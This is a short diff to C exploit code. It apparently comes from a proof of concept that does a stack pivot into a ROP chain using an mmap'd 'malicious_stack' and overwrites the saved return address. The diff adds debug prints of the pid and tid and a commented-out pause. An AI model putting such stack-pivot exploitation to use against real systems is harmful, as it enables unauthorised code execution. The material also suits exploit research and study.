@@ -93,12 +93,22 @@ void do_stack_pivot()
     *(saved_rip+1) = (unsigned long) 0x4141414141414141; // padding
 
     // kick off smaller rop chain
+    puts("[I] Pausing... Press Any Key to stack pivot");
+    /*
+    getchar();
+    //*/
     puts("[I] doing stack pivot...");
     return;
 }
 
 int main(int argc, char **argv)
 {
+    pid_t pid, tid;
+
+    pid = getpid();
+    tid = gettid();
+    printf("[I] pid:tid %d:%d\n", pid, tid);
+
     malicious_stack = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, 0, 0);
     if (malicious_stack == MAP_FAILED) {
         //error
